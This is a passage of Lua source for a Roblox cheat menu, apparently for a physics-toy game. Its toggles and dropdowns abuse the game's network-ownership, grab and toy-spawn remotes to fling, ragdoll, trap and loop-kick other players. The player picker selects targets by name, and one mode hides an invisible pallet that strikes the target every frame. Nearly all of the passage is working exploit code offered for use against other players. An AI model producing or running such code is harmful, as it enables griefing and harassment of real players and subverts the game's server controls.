        if typeof(potentialPart) == "Instance" and (potentialPart:FindFirstChild("PartOwner") and potentialPart.PartOwner.Value == localPlayer.Name) then
            return not condition and true or potentialPart.PartOwner
        end
    end

    local function CheckNetworkOwnerShipOnPlayer(potentialPlayer, condition)
        if typeof(potentialPlayer) == "Instance" and (potentialPlayer:IsA("Player") and potentialPlayer.Character) and (potentialPlayer.Character:FindFirstChild("Head") and (potentialPlayer.Character.Head:FindFirstChild("PartOwner") and potentialPlayer.Character.Head.PartOwner.Value == localPlayer.Name)) then
            return not condition and true or potentialPlayer.Character.Head.PartOwner
        end
    end

    local function SNOWshipPlayer(otherPlayer, callbackFunction)
        if localPlayer.Character and (localPlayer.Character:FindFirstChild("HumanoidRootPart") and (typeof(otherPlayer) == "Instance" and (otherPlayer:IsA("Player") and otherPlayer.Character)) and otherPlayer.Character:FindFirstChild("HumanoidRootPart")) then
            local otherPlayerHumanoidRootPart = otherPlayer.Character.HumanoidRootPart
            local distanceFromOtherPlayer = localPlayer:DistanceFromCharacter(otherPlayerHumanoidRootPart.Position)
            if CheckNetworkOwnerShipOnPlayer(otherPlayer) then
                if type(callbackFunction) == "function" then
                    callbackFunction()
                end
                return true
            end
            if distanceFromOtherPlayer <= 30 then
                setNetworkOwnerEvent:FireServer(otherPlayerHumanoidRootPart, lookAt(localPlayer.Character.HumanoidRootPart.Position, otherPlayerHumanoidRootPart.Position))
            end
        end
    end

    local function SNOWshipTrack(targetPart)
        if targetPart.Parent and targetPart.Parent:IsA("Model") then
            local targetModel = targetPart.Parent
            local isOwnershipTrackConnected = targetModel:GetAttribute("OwnershipTrackConnected")
            local isCreatedConnected2 = targetModel:GetAttribute("CreatedConnected2")
            if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local distanceFromCharacter = localPlayer:DistanceFromCharacter(targetPart.Position)
                if isCreatedConnected2 then
                    if isOwnershipTrackConnected then
                        return true
                    end
                    if distanceFromCharacter <= 30 then
                        setNetworkOwnerEvent:FireServer(targetPart, lookAt(localPlayer.Character.HumanoidRootPart.Position, targetPart.Position))
                    end
                else
                    targetModel:SetAttribute("CreatedConnected2", true)
                    targetModel.DescendantAdded:Connect(function(attribute)
                        if attribute.Name ~= "PartOwner" or attribute.Value ~= localPlayer.Name then
                            if attribute.Name == "PartOwner" and attribute.Value ~= localPlayer.Name then
                                targetModel:SetAttribute("OwnershipTrackConnected", false)
                            end
                        else
                            targetModel:SetAttribute("OwnershipTrackConnected", true)
                        end
                    end)
                end
            end
        end
    end

    -- Target Validation Checks
    local function CheckPlayer(potentialPlayer)
        if typeof(potentialPlayer) == "Instance" and (potentialPlayer ~= localPlayer and potentialPlayer.Character) and (potentialPlayer.Character:IsDescendantOf(workspaceService) and (potentialPlayer.Character:FindFirstChild("HumanoidRootPart") and (potentialPlayer.Character:FindFirstChildOfClass("Humanoid") and potentialPlayer.Character.Humanoid.Health > 0))) then
            return true
        end
    end

    local function CheckPlayerAuras(potentialKickedPlayer1)
        if CheckPlayer(potentialKickedPlayer1) and not potentialKickedPlayer1.Character:GetAttribute("Kicking") then
            return true
        end
    end

    -- Spatial parameters for finding loose objects
    local COAroundPParams = OverlapParams.new()
    COAroundPParams.FilterType = Enum.RaycastFilterType.Exclude

    local function CheckObjectsAroundPlayer()
        -- Ensure this list dynamically updates locally within the function
        COAroundPParams.FilterDescendantsInstances = {
            GetPlayerCharacter(),
            workspaceService.Map,
            workspaceService.Plots,
            workspaceService.Waypoints,
            workspaceService.Slots
        }
        
        local playerRoot = GetPlayerRoot()
        if playerRoot then
            local connectedPartsList = {}
            local teslaCoil = nil
            local function isPartConnectable(part)
                if not part:IsDescendantOf(workspaceService.Map) and (not part:IsDescendantOf(workspaceService.Plots) and (not part:IsDescendantOf(workspaceService.Waypoints) and (not part:IsDescendantOf(workspaceService.Slots) and part.Parent))) and (part.Parent:IsA("Model") and (part.Parent:FindFirstChildOfClass("BasePart") or (part.Parent:FindFirstChildOfClass("Part") or part.Parent:FindFirstChildOfClass("MeshPart")))) then
                    local partParent = part.Parent
                    local isConnected2 = partParent:GetAttribute("Connected2")
                    
                    local playerFromCharacter
                    if partParent:FindFirstChildOfClass("Humanoid") then
                        playerFromCharacter = playersService:GetPlayerFromCharacter(partParent)
                    else
                        playerFromCharacter = nil
                    end
                    if not (playerFromCharacter or isConnected2) then
                        return true
                    end
                end
            end
            local partsInRadius = workspaceService:GetPartBoundsInRadius(playerRoot.Position, 28, COAroundPParams)
            local iterator, partIndex, index = pairs(partsInRadius)
            while true do
                local instance
                index, instance = iterator(partIndex, index)
                if index == nil then
                    break
                end
                if isPartConnectable(instance) then
                    local instanceParent = instance.Parent
                    if not table.find(connectedPartsList, instanceParent) then
                        table.insert(connectedPartsList, instanceParent)
                    end
                end
            end
            return connectedPartsList, teslaCoil
        end
    end

    -- // TelekinesisGroup UI Mapping \\ --

    TelekinesisGroup:CreateToggle({
        Name = "Fling Aura",
        Flag = "flingaura_toggle",
        Default = false,
        Callback = function(flingAuraEnabled)
            -- Apply typical UI State mapping
            if SetToggleState then SetToggleState("flingaura_toggle", flingAuraEnabled) end
            
            _G.FlingAura = flingAuraEnabled
            if flingAuraEnabled then
                -- Wrap in task.spawn to prevent yielding the main UI thread
                task.spawn(function()
                    while _G.FlingAura do
                        -- FLING OBJECTS
                        if _G.FlingTarget == 2 or _G.FlingTarget == 3 then
                            local objectsAroundPlayer, flingTargetPart = CheckObjectsAroundPlayer()
                            if objectsAroundPlayer then
                                local pairsIterator, pairsState, pairsIndex = pairs(objectsAroundPlayer)
                                while true do
                                    local childObject
                                    pairsIndex, childObject = pairsIterator(pairsState, pairsIndex)
                                    if pairsIndex == nil then
                                        break
                                    end
                                    local retryCount1 = 0
                                    if childObject then
                                        local headPart = childObject:FindFirstChild("Head")
                                        local childPairsIterator, iteratorValue7, childPairsIndex = pairs(childObject:GetChildren())
                                        while true do
                                            local childPart
                                            childPairsIndex, childPart = childPairsIterator(iteratorValue7, childPairsIndex)
                                            if childPairsIndex == nil then
                                                break
                                            end
                                            if childPart:IsA("BasePart") and childPart.CanQuery then
                                                local networkOwnership = SNOWshipTrack(childPart)
                                                local playerRootPart = GetPlayerRoot()
                                                if not networkOwnership and headPart then
                                                    networkOwnership = CheckNetworkOwnerShipOnPart(headPart)
                                                end
                                                if networkOwnership and playerRootPart then
                                                    if flingTargetPart then
                                                        local currentPosition = flingTargetPart.Position
                                                        flingTargetPart.Position = childPart.Position
                                                        task.wait()
                                                        flingTargetPart.Position = currentPosition
                                                    elseif not childPart:FindFirstChild("FlingAuraVelocity") then
                                                        local lookAtCFrame = lookAt(playerRootPart.Position, childPart.Position)
                                                        local flingBodyVelocity = Instance.new("BodyVelocity", childPart)
                                                        flingBodyVelocity.Name = "FlingAuraVelocity"
                                                        flingBodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                                        flingBodyVelocity.Velocity = Vector3.new(lookAtCFrame.lookVector.X, 0.5, lookAtCFrame.lookVector.Z) * math.clamp(_G.FlingStrength, 400, 600)
                                                        debrisService:AddItem(flingBodyVelocity)
                                                    end
                                                    retryCount1 = retryCount1 + 1
                                                end
                                                if retryCount1 >= 3 then
                                                    break
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end

                        -- FLING PLAYERS
                        if _G.FlingTarget == 1 or _G.FlingTarget == 3 then
                            local playerPairsIterator, iteratorValue8, playerPairsIndex = pairs(playersService:GetPlayers())
                            while true do
                                local otherPlayer
                                playerPairsIndex, otherPlayer = playerPairsIterator(iteratorValue8, playerPairsIndex)
                                if playerPairsIndex == nil then
                                    break
                                end
                                if CheckPlayerAuras(otherPlayer) then
                                    local otherPlayerRootPart = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
                                    local snowshipPlayer = SNOWshipPlayer(otherPlayer)
                                    local localPlayerCharacter = GetPlayerCharacter()
                                    if otherPlayerRootPart and (snowshipPlayer and (localPlayerCharacter and not otherPlayerRootPart:FindFirstChild("FlingAuraVelocity"))) then
                                        local flingDirectionCFrame = lookAt(localPlayerCharacter.HumanoidRootPart.Position, otherPlayerRootPart.Position)
                                        local flingBodyVelocity = Instance.new("BodyVelocity", otherPlayerRootPart)
                                        flingBodyVelocity.Name = "FlingAuraVelocity"
                                        flingBodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                        flingBodyVelocity.Velocity = Vector3.new(flingDirectionCFrame.lookVector.X, 0.5, flingDirectionCFrame.lookVector.Z) * _G.FlingStrength
                                        debrisService:AddItem(flingBodyVelocity)
                                    end
                                end
                            end
                        end
                        task.wait(0.1)
                    end
                end)
            end
        end
    })

    TelekinesisGroup:CreateSlider({
        Name = "Strength",
        Flag = "flingstrengthvalue_toggle",
        Min = 400,
        Max = 10000,
        Default = 400,
        Rounding = 0,
        Callback = function(flingStrength)
            _G.FlingStrength = flingStrength
        end
    })

    TelekinesisGroup:CreateDropdown({
        Name = "Target",
        Flag = "flingtarget_dropdown",
        Items = {
            "Players",
            "Objects",
            "Players and Objects"
        },
        Default = "Players",
        Callback = function(flingTargetType)
            if flingTargetType == "Players" then
                _G.FlingTarget = 1
            elseif flingTargetType == "Objects" then
                _G.FlingTarget = 2
            elseif flingTargetType == "Players and Objects" then
                _G.FlingTarget = 3
            end
        end
    })
end
-- 1. Target Interaction Dropdown
local PlayerDropdown = TargetGroup:CreateDropdown({
    Name = "Select player for kick",
    List = getPlayerList(),
    Default = nil,
    Callback = function(Value)
        selectedKickPlayer = getPlayerFromSelection(Value)
    end,
})

-- // Automatic Refresh Logic \\ --

local function updateDropdown()
    local newList = getPlayerList()
    
    if PlayerDropdown then
        -- We use 'false' here so your current selection doesn't reset 
        -- every time a random person joins the server.
        PlayerDropdown:Refresh(newList, false)
    end
    
    -- Safety: If the target left the game, clear the variable
    if selectedKickPlayer and not selectedKickPlayer.Parent then
        selectedKickPlayer = nil
    end
end

-- // Event Connections \\ --

-- These listen for server changes to trigger the UI update
PS.PlayerAdded:Connect(updateDropdown)
PS.PlayerRemoving:Connect(updateDropdown)

-- Initial run to populate the list correctly on startup
updateDropdown()
-- These listeners make the list update automatically
local addedConn = PS.PlayerAdded:Connect(updateDropdown)
local removedConn = PS.PlayerRemoving:Connect(updateDropdown)

-- Ensure the script cleans up if the UI is destroyed/reloaded
Player.CharacterRemoving:Connect(function()
    addedConn:Disconnect()
    removedConn:Disconnect()
end)
TargetGroup:CreateInput({
    Name = "Find By Nick [PARTIAL]",
    Default = "",
    TextDisappear = true,
    Callback = function(Value)
        if Value == "" then return end

        Value = Value:lower()

        for _, plr in ipairs(PS:GetPlayers()) do
            local nameMatch = plr.Name:lower():sub(1, #Value) == Value
            local displayMatch = plr.DisplayName:lower():sub(1, #Value) == Value

            if nameMatch or displayMatch then
                -- Сразу выбираем игрока и сохраняем имя
                selectedKickPlayer = plr
                selectedKickPlayerName = plr.Name

                -- Строка должна совпадать с той, которую использует getPlayerList()
                local displayString = string.format(
                    '<font color="rgb(255,0,0)"><b>%s</b></font> <b><i>(%s)</i></b>',
                    plr.Name,
                    plr.DisplayName
                )

                -- This triggers the dropdown to select them, and updates the list state naturally
                PlayerDropdown:Set(displayString)
                break
            end
        end
    end
})

local customKickHeight = 25
local kickLoopEnabled = false

-- 1. THE INPUT BOX (Where you type the height)
TargetGroup:CreateInput({
    Name = "Custom Kick Height",
        Flag = "Custom Kick Height",
    Default = "25",
    Placeholder = "Enter height (e.g. 50)",
    Numeric = true, -- Only allows numbers
    Finished = true, -- Updates when you press Enter
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            customKickHeight = num
        else
            customKickHeight = 25 -- Fallback if input is empty or invalid
        end
    end
})

do
    local SpamSetOwner = {
        AutoRagdoll = false,
        Segments = 8,
        ImpactPower = 10
    }

    TargetGroup:CreateToggle({
        Name = "Ragdoll Spam (Better)",
        Flag = "RagdollSpamHammer",
        Default = false,
        Callback = function(Value)
            SetToggleState("RagdollSpamHammer", Value)
            SpamSetOwner.AutoRagdoll = Value
            
            local RS = game:GetService("ReplicatedStorage")
            local RunService = game:GetService("RunService")
            local Player = game:GetService("Players").LocalPlayer
            
            if Value then
                if not selectedKickPlayer then
                    Library:Notify({ Title = "Error", Content = "Select a target player first!", Duration = 3 })
                    SpamSetOwner.AutoRagdoll = false
                    return
                end

                task.spawn(function()
                    -- 1. Fetch necessary remotes
                    local MenuToys = RS:WaitForChild("MenuToys")
                    local GrabEvents = RS:WaitForChild("GrabEvents")
                    
                    local rSpawn = MenuToys:WaitForChild("SpawnToyRemoteFunction")
                    local rDestroy = MenuToys:WaitForChild("DestroyToy")
                    local rOwner = GrabEvents:WaitForChild("SetNetworkOwner")

                    -- 2. Spawn the Pallet
                    if rSpawn and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
                        task.spawn(function() 
                            rSpawn:InvokeServer("PalletLightBrown", Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 5, 0), Vector3.zero) 
                        end)
                    end
                    
                    -- 3. Wait for Pallet to load locally
                    local toyFolder = workspace:WaitForChild(Player.Name .. "SpawnedInToys", 5)
                    if not toyFolder then return end
                    
                    local palletModel = toyFolder:WaitForChild("PalletLightBrown", 5)
                    if not palletModel then return end
                    
                    local palletPart = palletModel:WaitForChild("SoundPart", 5)
                    if not palletPart then return end
                    
                    -- Claim initial ownership
                    if rOwner then 
                        rOwner:FireServer(palletPart, palletPart.CFrame) 
                    end
                    
                    local hammerGoingDown = true
                    local segmentIndex = 0
                    local lastOwnerTime = tick()
                    
                    -- 4. Main Hammer Loop
                    while SpamSetOwner.AutoRagdoll and palletModel.Parent do
                        RunService.Heartbeat:Wait()
                        
                        local targetChar = selectedKickPlayer and selectedKickPlayer.Character
                        local targetHrp = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
                        
                        if targetHrp and rOwner then
                            -- Re-claim network ownership periodically to fight desync
                            if tick() - lastOwnerTime > 1.0 then 
                                rOwner:FireServer(palletPart, palletPart.CFrame) 
                                lastOwnerTime = tick() 
                            end
                            
                            local startPos = targetHrp.Position + Vector3.new(0, 50000, 0)
                            local endPos = targetHrp.Position
                            
                            if hammerGoingDown then
                                segmentIndex = segmentIndex + 1
                                local alpha = segmentIndex / SpamSetOwner.Segments
                                local nextPos = startPos:Lerp(endPos, alpha)
                                
                                palletPart.CFrame = CFrame.new(nextPos)
                                palletPart.AssemblyLinearVelocity = Vector3.new(0, -50000, 0)
                                palletPart.AssemblyAngularVelocity = Vector3.zero
                                
                                if segmentIndex >= SpamSetOwner.Segments then
                                    palletPart.AssemblyLinearVelocity = Vector3.new(0, -SpamSetOwner.ImpactPower, 0)
                                    hammerGoingDown = false
                                end
                            else
                                palletPart.CFrame = CFrame.new(startPos)
                                palletPart.AssemblyLinearVelocity = Vector3.zero
                                segmentIndex = 0
                                hammerGoingDown = true
                            end
                        else
                            -- If target dies or is missing, idle the pallet above your own head
                            if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
                                palletPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 10, 0)
                                palletPart.AssemblyLinearVelocity = Vector3.zero
                            end
                        end
                    end
                    
                    -- 5. Cleanup when toggled off
                    if rDestroy and palletModel then 
                        rDestroy:FireServer(palletModel) 
                    end
                end)
            end
        end
    })
end

TargetGroup:CreateToggle({
    Name = "Pallet Ragdoll (Invis)",
    Flag = "Ragdoll Target",
    Default = false,
    Callback = function(Value)
        SetToggleState("Ragdoll Target", Value)
        local RS = game:GetService("ReplicatedStorage")
        local RunService = game:GetService("RunService")
        local DestroyToy = RS:WaitForChild("MenuToys"):WaitForChild("DestroyToy")
        local SetNetOwner = RS:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner")
        local DestroyLine = RS:WaitForChild("GrabEvents"):WaitForChild("DestroyGrabLine")
        local toysFolder = workspace:WaitForChild(LocalPlayer.Name .. "SpawnedInToys")
        local lpName = LocalPlayer.Name

        -- Clean up existing frame connections
        local function clearAttackLoop()
            if getgenv().ragdollSteppedConn then
                getgenv().ragdollSteppedConn:Disconnect()
                getgenv().ragdollSteppedConn = nil
            end
        end

        if Value then
            if not selectedKickPlayer then
                Library:Notify("Select target first", 3)
                return
            end

            getgenv().palletRagdollActive = true
            getgenv().PalletForRagdoll = nil
            
            if getgenv().palletCacheConn then
                getgenv().palletCacheConn:Disconnect()
            end
            clearAttackLoop()

            -- 1. Cache and Setup Pallet
            getgenv().palletCacheConn = toysFolder.ChildAdded:Connect(function(child)
                if not getgenv().palletRagdollActive then return end
                if child.Name ~= "PalletLightBrown" and child.Name ~= "PalletForRagdoll" then return end

                local soundPart = child:WaitForChild("SoundPart", 3)
                if not soundPart then return end

                -- Claim network ownership instantly
                pcall(function()
                    SetNetOwner:FireServer(soundPart, soundPart.CFrame)
                    DestroyLine:FireServer(soundPart)
                end)

                local partOwner = soundPart:WaitForChild("PartOwner", 1)
                if partOwner and partOwner.Value == lpName then
                    -- Make fully invisible and non-collidable for local player
                    for _, v in pairs(child:GetChildren()) do
                        if v:IsA("BasePart") then
                            v.CanCollide = false
                            v.CanQuery = false
                            v.Transparency = 1 
                        end
                    end

                    child.Name = "PalletForRagdoll"
                    getgenv().PalletForRagdoll = child

                    -- Toggle flag for the alternating strike directions
                    local strikePhase = false

                    -- 2. Engine-Synced Attack Loop (Stepped runs right before physics simulation)
                    getgenv().ragdollSteppedConn = RunService.Stepped:Connect(function()
                        if not getgenv().palletRagdollActive or not child.Parent then 
                            clearAttackLoop()
                            return 
                        end

                        local tChar = selectedKickPlayer and selectedKickPlayer.Character
                        local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
                        local tHum = tChar and tChar:FindFirstChildOfClass("Humanoid")

                        if tRoot and tHum and soundPart.Parent and tHum.Health > 0 then
                            local ragdolledVal = tHum:FindFirstChild("Ragdolled")
                            local isRagdolled = ragdolledVal and ragdolledVal.Value or false

                            if not isRagdolled then
                                -- Alternating hyper-velocity strikes every single frame
                                strikePhase = not strikePhase
                                if strikePhase then
                                    soundPart.CFrame = tRoot.CFrame * CFrame.new(0, 2, 0)
                                    soundPart.AssemblyLinearVelocity = Vector3.new(0, -9e5, 0)
                                else
                                    soundPart.CFrame = tRoot.CFrame * CFrame.new(0, -1, 0)
                                    soundPart.AssemblyLinearVelocity = Vector3.new(0, 9e5, 0)
                                end
                            else
                                -- Instantly pull away to reduce lag once ragdolled
                                soundPart.CFrame = CFrame.new(0, 9e9, 0)
                                soundPart.AssemblyLinearVelocity = Vector3.zero
                            end
                        else
                            soundPart.CFrame = CFrame.new(0, 9e9, 0)
                            soundPart.AssemblyLinearVelocity = Vector3.zero
                        end
                    end)

                    -- Handle respawn/destruction
                    child.AncestryChanged:Connect(function()
                        if not child.Parent then
                            clearAttackLoop()
                            getgenv().PalletForRagdoll = nil
                            if getgenv().palletRagdollActive then
                                task.wait(0.03)
                                if getgenv().spawnNewPallet then getgenv().spawnNewPallet() end
                            end
                        end
                    end)
                else
                    pcall(function() DestroyToy:FireServer(child) end)
                end
            end)

            -- 3. Toy Spawner Function
            getgenv().spawnNewPallet = function()
                if not getgenv().palletRagdollActive then return end
                if getgenv().PalletForRagdoll and getgenv().PalletForRagdoll.Parent then return end
                
                local c = LocalPlayer.Character
                local h = c and c:FindFirstChild("HumanoidRootPart")
                if not h then return end

                task.spawn(function()
                    pcall(function()
                        RS.MenuToys.SpawnToyRemoteFunction:InvokeServer(
                            "PalletLightBrown",
                            h.CFrame * CFrame.new(0, 10, 20),
                            Vector3.zero
                        )
                    end)
                end)
            end

            getgenv().spawnNewPallet()
        else
            -- Clean up everything completely
            getgenv().palletRagdollActive = false
            clearAttackLoop()

            if getgenv().palletCacheConn then
                getgenv().palletCacheConn:Disconnect()
                getgenv().palletCacheConn = nil
            end

            local pallet = getgenv().PalletForRagdoll
            if pallet and pallet.Parent then
                pcall(function() DestroyToy:FireServer(pallet) end)
            end

            getgenv().PalletForRagdoll = nil

            if toysFolder:FindFirstChild("PalletForRagdoll") then
                pcall(function() DestroyToy:FireServer(toysFolder.PalletForRagdoll) end)
            end
        end
    end,
})

do
    BlobGroup:CreateToggle({
        Name = "Auto Sit Blobman",
        Flag = "Auto Sit Blobman",
        Default = false,
        Callback = function(Value)
        SetToggleState("Auto Sit Blobman", Value)
            if Value then
                task.spawn(function()
                    while GetToggleState("Auto Sit Blobman") do
                        local Char = Player.Character
                        local Hum = Char and Char:FindFirstChildOfClass("Humanoid")
                        local Root = Char and Char:FindFirstChild("HumanoidRootPart")
                        if Hum and Root and not Hum.SeatPart then
                            local folder = workspace:FindFirstChild(Player.Name .. "SpawnedInToys")
                            local blob = folder and folder:FindFirstChild("CreatureBlobman")

                            -- Pas de blob, on en spawn un
                            if not blob then
                                pcall(function()
                                    RS.MenuToys.SpawnToyRemoteFunction:InvokeServer(
                                        "CreatureBlobman",
                                        Root.CFrame * CFrame.new(0, 5, 5),
                                        Vector3.zero
                                    )
                                end)
                                -- Attend que le blob apparaisse
                                local t0 = tick()
                                repeat
                                    R.Heartbeat:Wait()
                                    folder = workspace:FindFirstChild(Player.Name .. "SpawnedInToys")
                                    blob = folder and folder:FindFirstChild("CreatureBlobman")
                                until blob or tick() - t0 > 5 or not GetToggleState("Auto Sit Blobman")
                            end

                            -- Sit sur le blob
                            if blob then
                                local seat = blob:FindFirstChildWhichIsA("VehicleSeat")
                                if seat then
                                    Root.CFrame = seat.CFrame * CFrame.new(0, 1, 0)
                                    Root.Velocity = Vector3.zero
                                    seat:Sit(Hum)
                                end
                            end
                        end
                        task.wait(0.1)
                    end
                end)
            end
        end
    })
end
do

    local modeOptions = {
        "Loop Kick Blob",
        "XOCU (grab + blob)",
        "XOCU spam blob loop",
        "XOCU Kill Blob [Fast]"
    }

    local selectedBlobMode = "Loop Kick Blob"
    local blobActive = false
    local blobTask = nil
    local blobConnections = {}

    local function cleanupBlob()
        for _, conn in ipairs(blobConnections) do
            pcall(function() conn:Disconnect() end)
        end
        blobConnections = {}
        if blobTask then
            task.cancel(blobTask)
            blobTask = nil
        end
        blobActive = false
    end

    BlobGroup:CreateDropdown({
        Name = "Select Blob Mode",
        Items = modeOptions,
        Default = "Loop Kick Blob",
        Callback = function(Value)
            selectedBlobMode = Value
        end
    })

    BlobGroup:CreateToggle({
        Name = "Enable Blob Method",
        Default = false,
        Callback = function(State)
            if not State then
                cleanupBlob()
                return
            end

            if blobActive then
                cleanupBlob()
            end

            blobActive = State

            local targetName = selectedPlrName or (selectedKickPlayer and selectedKickPlayer.Name)
            if not targetName or targetName == "" then
                Library:Notify({ Title = "Error", Description = "Select target first!", Duration = 3 })
                blobActive = false
                return
            end

            if selectedBlobMode == "Loop Kick Blob" then
                blobTask = task.spawn(function()
                    local Players = game:GetService("Players")
                    local RS = game:GetService("ReplicatedStorage")
                    local RunService = game:GetService("RunService")
                    local LocalPlayer = Players.LocalPlayer
                    local GE = RS:WaitForChild("GrabEvents")

                    local REMOTE_DELAY = 0.002
                    local lastRemote = 0
                    local blobLoop = true

                    local function BlobGrabKickHard()
                        local target = Players:FindFirstChild(targetName)
                        if not target then 
                            warn("Target not found")
                            blobActive = false
                            return 
                        end

                        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
                        local hum = char:WaitForChild("Humanoid")
                        local seat = hum.SeatPart
                        if not seat or seat.Parent.Name ~= "CreatureBlobman" then
                            Library:Notify({ Title = "Error", Description = "Sit on Blobman first!", Duration = 3 })
                            blobActive = false
                            return
                        end

                        local blob = seat.Parent
                        local blobRoot = blob:FindFirstChild("HumanoidRootPart") or blob.PrimaryPart
                        local scriptObj = blob:WaitForChild("BlobmanSeatAndOwnerScript")
                        local CG = scriptObj:WaitForChild("CreatureGrab")
                        local CD = scriptObj:WaitForChild("CreatureDrop")

                        local R_Det = blob:WaitForChild("RightDetector")

                        local savedPos = blobRoot.CFrame
                        local dragging = false
                        local grabStartTime = 0

                        while blobLoop and blobActive do
                            local currentTarget = Players:FindFirstChild(targetName)
                            if not currentTarget then break end

                            char = LocalPlayer.Character
                            hum = char and char:FindFirstChild("Humanoid")
                            seat = hum and hum.SeatPart
                            if not seat or seat.Parent.Name ~= "CreatureBlobman" then
                                warn("Stopped: left Blobman")
                                break
                            end

                            blob = seat.Parent
                            blobRoot = blob:FindFirstChild("HumanoidRootPart") or blob.PrimaryPart

                            local tChar = currentTarget.Character
                            local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
                            local tHum = tChar and tChar:FindFirstChild("Humanoid")

                            if tRoot and tHum and tHum.Health > 0 and blobRoot then
                                tRoot.Velocity = Vector3.zero

                                if not dragging then
                                    blobRoot.CFrame = tRoot.CFrame
                                    blobRoot.Velocity = Vector3.zero

                                    if tick() - lastRemote >= REMOTE_DELAY then
                                        lastRemote = tick()

                                        pcall(function()
                                            tHum.PlatformStand = true
                                            tHum.Sit = true
                                            GE.SetNetworkOwner:FireServer(tRoot, blobRoot.CFrame)
                                            GE.DestroyGrabLine:FireServer(tRoot)
                                        end)
                                    end

                                    if grabStartTime == 0 then
                                        grabStartTime = tick()
                                    end

                                    if tick() - grabStartTime > 0.35 then
                                        dragging = true
                                        grabStartTime = 0
                                        blobRoot.CFrame = savedPos
                                        blobRoot.Velocity = Vector3.zero
                                    end
                                else
                                    blobRoot.CFrame = savedPos
                                    blobRoot.Velocity = Vector3.zero

                                    local lockPos = savedPos * CFrame.new(0, 23, 0)
                                    tRoot.CFrame = lockPos
                                    tHum.PlatformStand = true
                                    tHum.Sit = true

                                    if tick() - lastRemote >= REMOTE_DELAY then
                                        lastRemote = tick()

                                        pcall(function()
                                            GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                            GE.DestroyGrabLine:FireServer(tRoot)

                                            local weld = R_Det:FindFirstChild("RightWeld") or R_Det:FindFirstChildWhichIsA("Weld")
                                            if weld then
                                                CD:FireServer(weld)
                                                CG:FireServer(R_Det, tRoot, weld)
                                            end
                                        end)
                                    end
                                end
                            else
                                dragging = false
                                grabStartTime = 0
                            end

                            RunService.Heartbeat:Wait()
                        end

                        if blobRoot then
                            blobRoot.CFrame = savedPos
                            blobRoot.Velocity = Vector3.zero
                        end
                    end

                    task.spawn(BlobGrabKickHard)
                end)

            elseif selectedBlobMode == "XOCU (grab + blob)" then
                blobTask = task.spawn(function()
                    local RS = game:GetService("ReplicatedStorage")
                    local RunService = game:GetService("RunService")
                    local GE = RS:FindFirstChild("GrabEvents")
                    
                    local myChar = LocalPlayer.Character
                    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
                    
                    if not myRoot then 
                        blobActive = false
                        return 
                    end

                    local savedPos = myRoot.CFrame
                    local dragging = false
                    local grabStartTime = 0
                    local customKickHeight = 20

                    while blobActive do
                        local target = selectedKickPlayer
                        if not target or not target.Parent or not target.Character then break end
                        
                        local tChar = target.Character
                        local tRoot = tChar:FindFirstChild("HumanoidRootPart")
                        local tHum = tChar:FindFirstChild("Humanoid")
                        
                        local seat = myChar and myChar.Humanoid.SeatPart
                        
                        if tRoot and tHum and tHum.Health > 0 then
                            tRoot.AssemblyLinearVelocity = Vector3.zero
                            tRoot.Velocity = Vector3.zero

                            if seat then
                                local blobman = seat.Parent
                                local remoteFolder = blobman:FindFirstChild("BlobmanSeatAndOwnerScript")
                                local grab = remoteFolder and remoteFolder:FindFirstChild("CreatureGrab")
                                local drop = remoteFolder and remoteFolder:FindFirstChild("CreatureDrop")
                                
                                local L_Det = blobman:FindFirstChild("LeftDetector")
                                local R_Det = blobman:FindFirstChild("RightDetector")
                                local L_Weld = L_Det and (L_Det:FindFirstChild("LeftWeld") or L_Det:FindFirstChild("RigidConstraint"))
                                local R_Weld = R_Det and (R_Det:FindFirstChild("RightWeld") or R_Det:FindFirstChild("RigidConstraint"))

                                if grab and drop and L_Weld and R_Weld then
                                    pcall(function()
                                        grab:FireServer(L_Det, tRoot, L_Weld)
                                        grab:FireServer(R_Det, tRoot, R_Weld)
                                        drop:FireServer(L_Weld, tRoot)
                                        drop:FireServer(R_Weld, tRoot)
                                    end)
                                end
                            end

                            if not dragging then
                                myRoot.CFrame = tRoot.CFrame
                                if GE then
                                    pcall(function()
                                        tHum.PlatformStand = true
                                        GE.SetNetworkOwner:FireServer(tRoot, myRoot.CFrame)
                                        GE.CreateGrabLine:FireServer(tRoot, Vector3.zero, tRoot.Position, false)
                                    end)
                                end
                                
                                if grabStartTime == 0 then grabStartTime = tick() end
                                if tick() - grabStartTime > 0.3 then
                                    dragging = true
                                    grabStartTime = 0
                                end
                            else
                                local lockPos = savedPos * CFrame.new(0, customKickHeight, 0)
                                myRoot.CFrame = savedPos
                                tRoot.CFrame = lockPos
                                
                                if GE then
                                    pcall(function()
                                        tHum.PlatformStand = true
                                        GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                        GE.DestroyGrabLine:FireServer(tRoot)
                                        GE.CreateGrabLine:FireServer(tRoot, Vector3.zero, tRoot.Position, false)
                                    end)
                                end
                            end
                        else
                            dragging = false
                            grabStartTime = 0
                        end
                        
                        RunService.Heartbeat:Wait()
                    end

                    if myRoot and savedPos then
                        myRoot.CFrame = savedPos
                    end
                    blobActive = false
                end)

            elseif selectedBlobMode == "XOCU spam blob loop" then
                blobTask = task.spawn(function()
                    while blobActive do
                        local target = selectedKickPlayer
                        local char = LocalPlayer.Character
                        local seat = char and char.Humanoid.SeatPart
                        
                        if not seat or not target or not target.Character then
                            task.wait(0.5)
                            continue
                        end
                        
                        local blobman = seat.Parent
                        local remoteFolder = blobman:FindFirstChild("BlobmanSeatAndOwnerScript")
                        local grab = remoteFolder and remoteFolder:FindFirstChild("CreatureGrab")
                        local drop = remoteFolder and remoteFolder:FindFirstChild("CreatureDrop")
                        
